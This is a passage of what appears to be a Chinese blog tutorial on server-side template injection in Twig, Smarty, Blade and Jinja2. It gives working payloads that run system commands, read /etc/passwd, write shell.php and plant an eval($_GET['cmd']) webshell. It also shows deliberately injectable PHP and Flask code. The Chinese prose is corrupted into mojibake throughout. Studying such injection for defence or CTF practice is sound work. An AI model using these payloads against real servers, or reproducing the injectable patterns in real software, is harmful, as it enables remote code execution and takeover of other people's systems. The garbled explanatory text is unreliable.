class="punctuation">|</span><span class="keyword">map</span>(<span class="string">&quot;system&quot;</span>)<span class="punctuation">|</span><span class="keyword">join</span>(<span class="string">&quot;,&quot;</span>)</span></span><br><span class="line"><span class="template-variable"></span></span><br><span class="line"><span class="template-variable"><span class="template-variable">&#123;&#123;&#123;<span class="string">&quot;&lt;?php phpinfo();&quot;</span>:<span class="string">&quot;/var/www/html/shell.php&quot;</span>&#125;<span class="punctuation">|</span><span class="keyword">map</span>(<span class="string">&quot;file_put_contents&quot;</span>)&#125;&#125;</span></span></span><br><span class="line"><span class="template-variable"></span></span><br><span class="line"><span class="template-variable"><span class="template-variable">&#123;&#123;[<span class="string">&quot;id&quot;</span>,0]<span class="punctuation">|</span><span class="keyword">sort</span>(<span class="string">&quot;system&quot;</span>)<span class="punctuation">|</span><span class="keyword">join</span>(<span class="string">&quot;,&quot;</span>)&#125;&#125;</span></span></span><br><span class="line"><span class="template-variable"></span></span><br><span class="line"><span class="template-variable"><span class="template-variable">&#123;&#123;[<span class="string">&quot;id&quot;</span>]<span class="punctuation">|</span><span class="keyword">filter</span>(<span class="string">&quot;system&quot;</span>)<span class="punctuation">|</span><span class="keyword">join</span>(<span class="string">&quot;,&quot;</span>)&#125;&#125;</span></span></span><br><span class="line"><span class="template-variable"></span></span><br><span class="line"><span class="template-variable"><span class="template-variable">&#123;&#123;[0,0]<span class="punctuation">|</span><span class="keyword">reduce</span>(<span class="string">&quot;system&quot;</span>,<span class="string">&quot;id&quot;</span>)<span class="punctuation">|</span><span class="keyword">join</span>(<span class="string">&quot;,&quot;</span>)&#125;&#125;</span></span></span><br><span class="line"><span class="template-variable"></span></span><br><span class="line"><span class="template-variable"><span class="template-variable">&#123;&#123;[<span class="string">&#x27;cat /etc/passwd&#x27;</span>]<span class="punctuation">|</span><span class="keyword">filter</span>(<span class="string">&#x27;system&#x27;</span>)&#125;&#125;</span></span></span><br></pre></td></tr></table></figure></div><p><a class="link"   href="https://xz.aliyun.com/t/7518#toc-5" >TWIG å…¨ç‰ˆæœ¬é€šç”¨ SSTI payloads - å…ˆçŸ¥ç¤¾åŒº (aliyun.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><h2 id="Smarty"><a href="#Smarty" class="headerlink" title="Smarty"></a>Smarty</h2><p>Smartyæ˜¯æœ€æµè¡Œçš„PHPæ¨¡æ¿è¯­è¨€ä¹‹ä¸€ï¼Œä¸ºä¸å—ä¿¡ä»»çš„æ¨¡æ¿æ‰§è¡Œæä¾›äº†å®‰å…¨æ¨¡å¼ã€‚è¿™ä¼šå¼ºåˆ¶æ‰§è¡Œåœ¨ php å®‰å…¨å‡½æ•°ç™½åå•ä¸­çš„å‡½æ•°ï¼Œå› æ­¤æˆ‘ä»¬åœ¨æ¨¡æ¿ä¸­æ— æ³•ç›´æ¥è°ƒç”¨ php ä¸­ç›´æ¥æ‰§è¡Œå‘½ä»¤çš„å‡½æ•°(ç›¸å½“äºå­˜åœ¨äº†ä¸€ä¸ªdisable_function)</p><blockquote><p><code>$smarty</code>å†…ç½®å˜é‡å¯ç”¨äºè®¿é—®å„ç§ç¯å¢ƒå˜é‡ï¼Œæ¯”å¦‚æˆ‘ä»¬ä½¿ç”¨ self å¾—åˆ° smarty è¿™ä¸ªç±»ä»¥åæˆ‘ä»¬å°±å»æ‰¾ smarty ç»™æˆ‘ä»¬çš„çš„æ–¹æ³•</p></blockquote><p>smarty&#x2F;libs&#x2F;sysplugins&#x2F;smarty_internal_data.phpã€€ã€€â€”â€”&gt;ã€€ã€€getStreamVariable() è¿™ä¸ªæ–¹æ³•å¯ä»¥è·å–ä¼ å…¥å˜é‡çš„æµ</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="https://tva1.sinaimg.cn/large/e6c9d24ely1h5942j1v17j20zq0kc0ut.jpg"                      alt="image-20220817011709847"                ><figcaption>image-20220817011709847</figcaption></figure></p><p>å› æ­¤æˆ‘ä»¬å¯ä»¥ç”¨è¿™ä¸ªæ–¹æ³•è¯»æ–‡ä»¶ï¼Œpayload:</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="built_in">self</span>::<span class="title function_ invoke__">getStreamVariable</span>(<span class="string">&quot;file:///etc/passwd&quot;</span>)&#125;</span><br></pre></td></tr></table></figure></div><p>smarty&#x2F;libs&#x2F;sysplugins&#x2F;smarty_internal_write_file.phpã€€ã€€â€”â€”&gt;ã€€ã€€Smarty_Internal_Write_File è¿™ä¸ªç±»ä¸­æœ‰ä¸€ä¸ªwriteFileæ–¹æ³•</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Smarty_Internal_Write_File</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Writes file in a safe way to disk</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span>  string $_filepath complete filepath</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span>  string $_contents file content</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span>  Smarty $smarty    smarty instance</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@throws</span> SmartyException</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> boolean true</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">writeFile</span>(<span class="params"><span class="variable">$_filepath</span>, <span class="variable">$_contents</span>, Smarty <span class="variable">$smarty</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$_error_reporting</span> = <span class="title function_ invoke__">error_reporting</span>();</span><br><span class="line">        <span class="title function_ invoke__">error_reporting</span>(<span class="variable">$_error_reporting</span> &amp; ~E_NOTICE &amp; ~E_WARNING);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$smarty</span>-&gt;_file_perms !== <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="variable">$old_umask</span> = <span class="title function_ invoke__">umask</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$_dirpath</span> = <span class="title function_ invoke__">dirname</span>(<span class="variable">$_filepath</span>);</span><br><span class="line">        <span class="comment">// if subdirs, create dir structure</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$_dirpath</span> !== <span class="string">&#x27;.&#x27;</span> &amp;&amp; !<span class="title function_ invoke__">file_exists</span>(<span class="variable">$_dirpath</span>)) &#123;</span><br><span class="line">            <span class="title function_ invoke__">mkdir</span>(<span class="variable">$_dirpath</span>, <span class="variable">$smarty</span>-&gt;_dir_perms === <span class="literal">null</span> ? <span class="number">0777</span> : <span class="variable">$smarty</span>-&gt;_dir_perms, <span class="literal">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// write to tmp file, then move to overt file lock race condition</span></span><br><span class="line">        <span class="variable">$_tmp_file</span> = <span class="variable">$_dirpath</span> . DS . <span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;,&#x27;</span>), <span class="string">&#x27;_&#x27;</span>, <span class="title function_ invoke__">uniqid</span>(<span class="string">&#x27;wrt&#x27;</span>, <span class="literal">true</span>));</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_tmp_file</span>, <span class="variable">$_contents</span>)) &#123;</span><br><span class="line">            <span class="title function_ invoke__">error_reporting</span>(<span class="variable">$_error_reporting</span>);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SmartyException</span>(<span class="string">&quot;unable to write file <span class="subst">&#123;$_tmp_file&#125;</span>&quot;</span>);</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * Windows&#x27; rename() fails if the destination exists,</span></span><br><span class="line"><span class="comment">         * Linux&#x27; rename() properly handles the overwrite.</span></span><br><span class="line"><span class="comment">         * Simply unlink()ing a file might cause other processes</span></span><br><span class="line"><span class="comment">         * currently reading that file to fail, but linux&#x27; rename()</span></span><br><span class="line"><span class="comment">         * seems to be smart enough to handle that for us.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="title class_">Smarty</span>::<span class="variable">$_IS_WINDOWS</span>) &#123;</span><br><span class="line">            <span class="comment">// remove original file</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">is_file</span>(<span class="variable">$_filepath</span>)) &#123;</span><br><span class="line">                @<span class="title function_ invoke__">unlink</span>(<span class="variable">$_filepath</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// rename tmp file</span></span><br><span class="line">            <span class="variable">$success</span> = @<span class="title function_ invoke__">rename</span>(<span class="variable">$_tmp_file</span>, <span class="variable">$_filepath</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// rename tmp file</span></span><br><span class="line">            <span class="variable">$success</span> = @<span class="title function_ invoke__">rename</span>(<span class="variable">$_tmp_file</span>, <span class="variable">$_filepath</span>);</span><br><span class="line">            <span class="keyword">if</span> (!<span class="variable">$success</span>) &#123;</span><br><span class="line">                <span class="comment">// remove original file</span></span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">is_file</span>(<span class="variable">$_filepath</span>)) &#123;</span><br><span class="line">                    @<span class="title function_ invoke__">unlink</span>(<span class="variable">$_filepath</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// rename tmp file</span></span><br><span class="line">                <span class="variable">$success</span> = @<span class="title function_ invoke__">rename</span>(<span class="variable">$_tmp_file</span>, <span class="variable">$_filepath</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable">$success</span>) &#123;</span><br><span class="line">            <span class="title function_ invoke__">error_reporting</span>(<span class="variable">$_error_reporting</span>);</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SmartyException</span>(<span class="string">&quot;unable to write file <span class="subst">&#123;$_filepath&#125;</span>&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$smarty</span>-&gt;_file_perms !== <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// set file permissions</span></span><br><span class="line">            <span class="title function_ invoke__">chmod</span>(<span class="variable">$_filepath</span>, <span class="variable">$smarty</span>-&gt;_file_perms);</span><br><span class="line">            <span class="title function_ invoke__">umask</span>(<span class="variable">$old_umask</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">error_reporting</span>(<span class="variable">$_error_reporting</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><blockquote><p>å¯ä»¥çœ‹åˆ° writeFile å‡½æ•°ç¬¬ä¸‰ä¸ªå‚æ•°ä¸€ä¸ª Smarty ç±»å‹ï¼Œåæ¥æ‰¾åˆ°äº† self::clearConfig()ï¼Œè¿”å›ç±»å‹æ˜¯Smarty å‡½æ•°åŸå‹ï¼š</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">clearConfig</span>(<span class="params"><span class="variable">$varname</span> = <span class="literal">null</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> <span class="keyword">return</span> <span class="title class_">Smarty_Internal_Extension_Config</span>::<span class="title function_ invoke__">clearConfig</span>(<span class="variable">$this</span>, <span class="variable">$varname</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div></blockquote><p>å› æ­¤æˆ‘ä»¬å¯ä»¥æ„é€ payloadå†™ä¸ªwebshell:</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="title class_">Smarty_Internal_Write_File</span>::<span class="title function_ invoke__">writeFile</span>(<span class="variable">$SCRIPT_NAME</span>,<span class="string">&quot;&lt;?php eval(<span class="subst">$_GET</span>[&#x27;cmd&#x27;]); ?&gt;&quot;</span>,<span class="built_in">self</span>::<span class="title function_ invoke__">clearConfig</span>())&#125;</span><br></pre></td></tr></table></figure></div><h3 id="å¸¸è§æ³¨å…¥ç‚¹"><a href="#å¸¸è§æ³¨å…¥ç‚¹" class="headerlink" title="å¸¸è§æ³¨å…¥ç‚¹"></a>å¸¸è§æ³¨å…¥ç‚¹</h3><p>é¡µé¢æ˜¾ç¤ºipï¼Œè€ƒè™‘åœ¨å—XFFæ§åˆ¶ï¼ŒæŠ“åŒ…ä¿®æ”¹X-Forwarded-Forå€¼ä¸ºpayloadï¼Œå¯ä»¥å…ˆç”¨<code>&#123;7*7&#125;</code>æµ‹è¯•</p><p>å¦‚æœæ²¡æœ‰ç‰¹æ®Šè¿‡æ»¤ï¼Œå¯ä»¥ç›´æ¥ç”¨systemå‡½æ•°<code>&#123;system(&#39;cat /flag&#39;)&#125;</code></p><h3 id="å¸¸è§„åˆ©ç”¨æ–¹å¼"><a href="#å¸¸è§„åˆ©ç”¨æ–¹å¼" class="headerlink" title="å¸¸è§„åˆ©ç”¨æ–¹å¼"></a>å¸¸è§„åˆ©ç”¨æ–¹å¼</h3><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="variable">$smarty</span>.version&#125;  <span class="comment">#è·å–smartyçš„ç‰ˆæœ¬å·</span></span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;php&#125;<span class="title function_ invoke__">phpinfo</span>();&#123;/php&#125;  <span class="comment">#æ‰§è¡Œç›¸åº”çš„phpä»£ç </span></span><br></pre></td></tr></table></figure></div><blockquote><p>Smarty3ç‰ˆæœ¬ä¸­å·²ç»åºŸå¼ƒ{php}æ ‡ç­¾ï¼Œå¼ºçƒˆå»ºè®®ä¸è¦ä½¿ç”¨ã€‚åœ¨Smarty 3.1ï¼Œ{php}ä»…åœ¨SmartyBCä¸­å¯ç”¨</p></blockquote><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;<span class="title function_ invoke__">phpinfo</span>();&lt;/script&gt;   </span><br></pre></td></tr></table></figure></div><blockquote><p>è¿™ä¸ªåœ°æ–¹å€ŸåŠ©äº† {literal} è¿™ä¸ªæ ‡ç­¾ï¼Œå› ä¸º {literal} å¯ä»¥è®©ä¸€ä¸ªæ¨¡æ¿åŒºåŸŸçš„å­—ç¬¦åŸæ ·è¾“å‡ºã€‚ è¿™ç»å¸¸ç”¨äºä¿æŠ¤é¡µé¢ä¸Šçš„<u>Javascriptæˆ–cssæ ·å¼è¡¨</u>ï¼Œé¿å…å› ä¸ºSmartyçš„å®šç•Œç¬¦è€Œé”™è¢«è§£æã€‚ä½†æ˜¯è¿™ç§å†™æ³•åªé€‚ç”¨äºphp5ç¯å¢ƒ</p></blockquote><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="built_in">self</span>::<span class="title function_ invoke__">getStreamVariable</span>(<span class="string">&quot;file:///etc/passwd&quot;</span>)&#125;</span><br></pre></td></tr></table></figure></div><blockquote><p>è¯»æ–‡ä»¶ï¼Œ3.1.30çš„Smartyç‰ˆæœ¬ä¸­å®˜æ–¹å·²ç»æŠŠè¯¥é™æ€æ–¹æ³•åˆ é™¤</p></blockquote><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="keyword">if</span> <span class="title function_ invoke__">phpinfo</span>()&#125;&#123;/<span class="keyword">if</span>&#125;</span><br></pre></td></tr></table></figure></div><blockquote><p>Smartyçš„ {if} æ¡ä»¶åˆ¤æ–­å’ŒPHPçš„iféå¸¸ç›¸ä¼¼ï¼Œåªæ˜¯å¢åŠ äº†ä¸€äº›ç‰¹æ€§ã€‚æ¯ä¸ª{if}å¿…é¡»æœ‰ä¸€ä¸ªé…å¯¹çš„{&#x2F;if}ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨{else} å’Œ {elseif}ï¼Œå…¨éƒ¨çš„PHPæ¡ä»¶è¡¨è¾¾å¼å’Œå‡½æ•°éƒ½å¯ä»¥åœ¨ifå†…ä½¿ç”¨ï¼Œå¦‚||ï¼Œorï¼Œ&amp;&amp;ï¼Œandï¼Œis_array()ç­‰ç­‰ï¼Œå¦‚ï¼š{if is_array($array)}{&#x2F;if}</p><p>ä¹Ÿå¯ä»¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="keyword">if</span> <span class="title function_ invoke__">system</span>(<span class="string">&quot;ls&quot;</span>)&#125;&#123;/<span class="keyword">if</span>&#125;</span><br></pre></td></tr></table></figure></div></blockquote><h3 id="æ¼æ´æˆå› "><a href="#æ¼æ´æˆå› " class="headerlink" title="æ¼æ´æˆå› "></a>æ¼æ´æˆå› </h3><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">&#x27;./smarty/libs/&#x27;</span> . <span class="string">&#x27;Smarty.class.php&#x27;</span>);</span><br><span class="line">    <span class="variable">$smarty</span> = <span class="keyword">new</span> <span class="title class_">Smarty</span>();</span><br><span class="line">    <span class="variable">$ip</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>];</span><br><span class="line">    <span class="variable">$smarty</span>-&gt;<span class="title function_ invoke__">display</span>(<span class="string">&quot;string:&quot;</span>.<span class="variable">$ip</span>);     <span class="comment">// displayå‡½æ•°æŠŠæ ‡ç­¾æ›¿æ¢æˆå¯¹è±¡çš„phpå˜é‡ï¼›æ˜¾ç¤ºæ¨¡æ¿</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h2 id="Blade"><a href="#Blade" class="headerlink" title="Blade"></a>Blade</h2><p><a class="link"   href="https://www.cnblogs.com/sgm4231/p/10283661.html" >laravel Blade æ¨¡æ¿å¼•æ“ - å¿ƒä¹‹æ‰€ä¾ - åšå®¢å›­ (cnblogs.com) <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p>Blade æ¨¡æ¿å¼•æ“æœ‰ä¸‰ç§å¸¸è§çš„è¯­æ³•ï¼š</p><ul><li>é€šè¿‡ <code>&#123;&#123; &#125;&#125;</code> æ¸²æŸ“ PHP å˜é‡ï¼ˆæœ€å¸¸ç”¨ï¼‰</li><li>é€šè¿‡ <code>&#123;!! !!&#125;</code> æ¸²æŸ“åŸç”Ÿ HTML ä»£ç ï¼ˆç”¨äºå¯Œæ–‡æœ¬æ•°æ®æ¸²æŸ“ï¼‰</li><li>é€šè¿‡ä»¥ <code>@</code> ä½œä¸ºå‰ç¼€çš„ Blade æŒ‡ä»¤æ‰§è¡Œä¸€äº›æ§åˆ¶ç»“æ„å’Œç»§æ‰¿ã€å¼•å…¥ä¹‹ç±»çš„æ“ä½œ</li></ul><h3 id="æ¸²æŸ“æ•°æ®"><a href="#æ¸²æŸ“æ•°æ®" class="headerlink" title="æ¸²æŸ“æ•°æ®"></a>æ¸²æŸ“æ•°æ®</h3><p>æˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹ <code>&#123;&#123;&#125;&#125;</code> è¯­æ³•ï¼Œæˆ‘ä»¬é€šè¿‡é€šè¿‡è¯¥è¯­æ³•åŒ…è£¹éœ€è¦æ¸²æŸ“çš„ PHP å˜é‡ï¼Œå¦‚ <code>&#123;&#123; $variable &#125;&#125;</code>ï¼Œä½ å¯ä»¥å°†å…¶ç±»æ¯”ä¸º <code>&lt;?php echo $variable; ?&gt;</code>ï¼Œä½†æ˜¯ Blade æ¨¡æ¿ä»£ç çš„åŠŸèƒ½è¦æ›´å¼ºå¤§ï¼Œé€šè¿‡ <code>&#123;&#123;&#125;&#125;</code> è¯­æ³•åŒ…è£¹æ¸²æŸ“çš„ PHP å˜é‡ä¼šé€šè¿‡ <code>htmlentities()</code> æ–¹æ³•è¿›è¡Œ HTML å­—ç¬¦è½¬ä¹‰ï¼Œä»è€Œé¿å…ç±»ä¼¼ XSS è¿™ç§æ”»å‡»ï¼Œæé«˜äº†ä»£ç çš„å®‰å…¨æ€§ï¼Œæ‰€ä»¥ <code>&#123;&#123; $variable &#125;&#125;</code> ç¼–è¯‘åçš„æœ€ç»ˆä»£ç æ˜¯ï¼š</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="title function_ invoke__">htmlentities</span>(<span class="variable">$variable</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div><p>ä½†æ˜¯æŸäº›æƒ…å†µä¸‹ä¸èƒ½å¯¹å˜é‡ä¸­ HTML å­—ç¬¦è¿›è¡Œè½¬ä¹‰ï¼Œæ¯”å¦‚æˆ‘ä»¬åœ¨è¡¨å•é€šè¿‡å¯Œæ–‡æœ¬ç¼–è¾‘å™¨ç¼–è¾‘åæäº¤çš„è¡¨å•æ•°æ®ï¼Œè¿™ç§åœºæ™¯å°±éœ€è¦é€šè¿‡ <code>&#123;!! !!&#125;</code> æ¥åŒ…è£¹å¾…æ¸²æŸ“æ•°æ®äº†ï¼š</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;!! <span class="variable">$variable</span> !!&#125;</span><br></pre></td></tr></table></figure></div><p>è¿™æ ·ç¼–è¯‘åçš„ä»£ç å°±æ˜¯ <code>&lt;?php echo $variable; ?&gt;</code> äº†</p><p>å¦‚æœè¦æ³¨é‡Šä¸€æ®µ PHP ä»£ç ï¼Œå¯ä»¥é€šè¿‡ <code>&#123;&#123;-- æ³¨é‡Šå†…å®¹ --&#125;&#125;</code> å®ç°</p><h2 id="Pythonä¸­çš„SSTI"><a href="#Pythonä¸­çš„SSTI" class="headerlink" title="Pythonä¸­çš„SSTI"></a>Pythonä¸­çš„SSTI</h2><p>pythonå¸¸è§çš„æ¨¡æ¿æœ‰ï¼šJinja2ï¼Œtornado</p><h2 id="Jinja2"><a href="#Jinja2" class="headerlink" title="Jinja2"></a>Jinja2</h2><p>Jinja2æ˜¯ä¸€ç§é¢å‘Pythonçš„ç°ä»£å’Œè®¾è®¡å‹å¥½çš„æ¨¡æ¿è¯­è¨€ï¼Œå®ƒæ˜¯ä»¥Djangoçš„æ¨¡æ¿ä¸ºæ¨¡å‹çš„</p><p>Jinja2æ˜¯Flaskæ¡†æ¶çš„ä¸€éƒ¨åˆ†ã€‚Jinja2ä¼šæŠŠæ¨¡æ¿å‚æ•°æä¾›çš„ç›¸åº”çš„å€¼æ›¿æ¢äº†<code> &#123;&#123;â€¦&#125;&#125;</code> å—</p><p>Jinja2ä½¿ç”¨<code> &#123;&#123;name&#125;&#125;</code>ç»“æ„è¡¨ç¤ºä¸€ä¸ªå˜é‡ï¼Œå®ƒæ˜¯ä¸€ç§ç‰¹æ®Šçš„å ä½ç¬¦ï¼Œå‘Šè¯‰æ¨¡ç‰ˆå¼•æ“è¿™ä¸ªä½ç½®çš„å€¼ä»æ¸²æŸ“æ¨¡ç‰ˆæ—¶ä½¿ç”¨çš„æ•°æ®ä¸­è·å–ã€‚</p><p>Jinja2 æ¨¡æ¿åŒæ ·æ”¯æŒæ§åˆ¶è¯­å¥ï¼Œåƒåœ¨<code>&#123;%â€¦%&#125;</code>å—ä¸­ï¼Œä¸‹é¢ä¸¾ä¸€ä¸ªå¸¸è§çš„ä½¿ç”¨Jinja2æ¨¡æ¿å¼•æ“forè¯­å¥å¾ªç¯æ¸²æŸ“ä¸€ç»„å…ƒç´ çš„ä¾‹å­ï¼š</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;ul&gt;</span><br><span class="line">     &#123;% <span class="keyword">for</span> comment <span class="keyword">in</span> comments %&#125;</span><br><span class="line">         &lt;li&gt;&#123;&#123;comment&#125;&#125;&lt;/li&gt;</span><br><span class="line">     &#123;% endfor %&#125;</span><br><span class="line">&lt;/ul&gt;</span><br></pre></td></tr></table></figure></div><p>å¦å¤–Jinja2 èƒ½è¯†åˆ«æ‰€æœ‰ç±»å‹çš„å˜é‡ï¼Œç”šè‡³æ˜¯ä¸€äº›å¤æ‚çš„ç±»å‹ï¼Œä¾‹å¦‚åˆ—è¡¨ã€å­—å…¸å’Œå¯¹è±¡ã€‚æ­¤å¤–ï¼Œè¿˜å¯ä½¿ç”¨è¿‡æ»¤å™¨ä¿®æ”¹å˜é‡ï¼Œè¿‡æ»¤å™¨åæ·»åŠ åœ¨å˜é‡åä¹‹åï¼Œä¸­é—´ä½¿ç”¨ç«–çº¿åˆ†éš”ã€‚ä¾‹å¦‚ï¼Œä¸‹è¿°æ¨¡æ¿ä»¥é¦–å­—æ¯å¤§å†™å½¢å¼æ˜¾ç¤ºå˜é‡nameçš„å€¼</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hello, &#123;&#123;name|capitalize&#125;&#125;</span><br></pre></td></tr></table></figure></div><h3 id="å¯æ³¨å…¥æƒ…å½¢ä»£ç "><a href="#å¯æ³¨å…¥æƒ…å½¢ä»£ç " class="headerlink" title="å¯æ³¨å…¥æƒ…å½¢ä»£ç "></a>å¯æ³¨å…¥æƒ…å½¢ä»£ç </h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    name = request.args.get(<span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;guest&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    t = Template(<span class="string">&quot;Hello &quot;</span> + name)</span><br><span class="line">    <span class="keyword">return</span> t.render()</span><br></pre></td></tr></table></figure></div><blockquote><p>getä¼ å‚ <code>&#123;&#123;2*2&#125;&#125;</code> æ˜¾ç¤º4</p></blockquote><h3 